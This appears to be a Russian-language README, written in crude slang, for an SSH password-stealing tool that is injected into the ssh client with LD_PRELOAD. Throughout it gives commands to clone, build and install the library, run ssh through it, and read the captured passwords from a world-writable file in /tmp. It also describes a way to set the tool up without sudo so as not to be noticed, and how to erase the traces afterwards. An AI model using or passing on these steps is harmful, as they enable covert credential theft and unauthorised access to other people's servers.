# КАК ЮЗАТЬ ЭТУ ПРОГУ НОРМАЛЬНО

## САМЫЙ ПРОСТОЙ ЗАПУСК (ДЛЯ СОВСЕМ ЧАЙНИКОВ)
```
# 1. Скачиваем из гитхаба
git clone https://github.com/Personaz1/ScrScr.git

# 2. Заходим в папку
cd ScrScr

# 3. Собираем
make

# 4. Запускаем для теста
./quick_test.sh

# 5. Ставим в систему (если нужно)
sudo ./install.sh
```

После этого все готово к работе! Просто запускай так:
```
LD_PRELOAD=./libssh_inject.so ssh твой_юзер@твой_сервер
```

## ЧЕ ЭТО ТАКОЕ ВАЩЕ?
Короче, эта прога палит пароли от SSH. Когда юзер коннектится куда-то по SSH и вводит пасс, мы его тихо сливаем себе. Четко, ровно, без палева.

## КАК СОБРАТЬ
Просто въебашь:
```
make
```
И все, библиотека собралась в libssh_inject.so. Если с первого раза не получилось, сначала сделай:
```
make clean
```

## БЫСТРЫЙ ТЕСТ (ДЛЯ СВОИХ)
Запускай:
```
./quick_test.sh
```
Он сам все сделает - соберет, создаст лог-файл и попробует коннект на localhost. Если спросит пасс от sudo - вводи.

## СТАВИМ НА МАШИНУ (ПО-ТИХОМУ)
### ВАРИАНТ 1 (ДЛЯ ЧАЙНИКОВ)
```
sudo ./install.sh
```
Все само встанет куда надо, созаст лог-файл и будет готово к работе.

### ВАРИАНТ 2 (БЕЗ ПАЛЕВА)
Если не хочешь светиться с sudo:
```
# Собираем
make

# Создаем куда писать пароли
touch /tmp/ssh_inj.dbg
chmod 666 /tmp/ssh_inj.dbg
```

## КАК ЮЗАТЬ ПОСЛЕ УСТАНОВКИ
Просто запускай SSH с перехватом:
```
LD_PRELOAD=/usr/lib/libssh_inject.so ssh user@server
```
Или если не ставил по-системному:
```
LD_PRELOAD=./libssh_inject.so ssh user@server
```

## ГДЕ ИСКАТЬ ПАРОЛИ
Все палево сливается в файл:
```
/tmp/ssh_inj.dbg
```
Дергай их оттуда так:
```
cat /tmp/ssh_inj.dbg
```

## КАК УДАЛИТЬ СЛЕДЫ
Чтобы все почистить:
```
sudo ./uninstall.sh
```
Или просто сам удали:
```
sudo rm -f /usr/lib/libssh_inject.so /tmp/ssh_inj.dbg
```
